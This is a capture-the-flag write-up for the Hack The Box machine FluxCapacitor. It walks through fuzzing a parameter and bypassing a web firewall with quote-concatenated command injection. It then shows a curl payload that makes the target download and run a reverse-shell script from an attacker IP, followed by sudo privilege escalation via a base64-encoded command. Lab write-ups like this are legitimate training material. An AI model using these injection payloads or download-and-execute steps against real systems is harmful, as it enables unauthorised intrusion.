# FluxCapacitor
[![FluxCapacitor](https://www.hackthebox.eu/storage/avatars/c494431a9d3f52bd96e5cc2cf94f06e4.png)](https://www.hackthebox.eu/home/machines/profile/119)

## Initial Foothold
We run nmap and we find out that port 80 is open and superwaf firewall is used.
```sh
$ nmap -T4 -A -v 10.10.10.69
```
Using dirb to search for directories doesn't really help because there is nothing to be found. All we got is the page "sync" we found from "View Page Source". We suspect that superwaf firewall might filters our attack. We can confirm that by causing a fault in the server simply sending an http request with wrong syntax. So we got the page (sync) and we need to find the parameter name (if exist). For this we give a value to the supposed parameter and if it is filtered by superwaf we will get the corresponding error and at the same time we will know the right parameter name.
```sh
$ wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt --filter="c=403" http://10.10.10.69/sync?FUZZ=\ls
```
This will return only the responses with error code 403 wich will be caused from superwaf while it's trying to block the "ls" comand we gave as a value. The error code 403 was returned while the name of the parameter was ***opt***. Now we have to find the right value for this parameter and bypass the superwaf firewall. The ***'*** symbol as well as the \ symbol, is used in bash to concatenate strings. We can exploit this feature and use it to bypass the firewall. So we create a [reverse.py](https://github.com/pamehabai6/Permission-Denied/blob/master/Write-ups/FluxCapacitor/reverse.py) and upload it to the remote. Next we give it privileges and execute it.
```sh
$ nc -lvp 1234
$ curl -s http://10.10.10.69/sync?opt=' wg'et' 'http://10.10.14.10/reverse.py' '-P' 'tmp
$ curl -s http://10.10.10.69/sync?opt=' pyth'on3' '/tmp/reverse.py
$ curl -s "http://10.10.10.69/sync?opt=' \l\s -la /tmp'"
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ cat /home/FluxCapacitorInc/user.txt
```

## Privesc
By executing the command bellow, we find out that we can run as the root user the program ***/home/themiddle/.monit***. If we read the code we can see that if we encode the parameter in base64, we can execute it as following.
```sh
$ sudo -l
$ sudo -u root ./.monit cmd Y2F0IC9yb290L3Jvb3QudHh0
```
Where ***Y2F0IC9yb290L3Jvb3QudHh0*** is ***cat /root/root.txt*** encode in base64.

***And we finally got root!***

[![bertolis](https://www.hackthebox.eu/badge/image/27897)](https://www.hackthebox.eu/home/users/profile/27897)  [![Fluxcapacitor](https://www.hackthebox.eu/images/logofull-tr-web.png)](https://www.hackthebox.eu/)
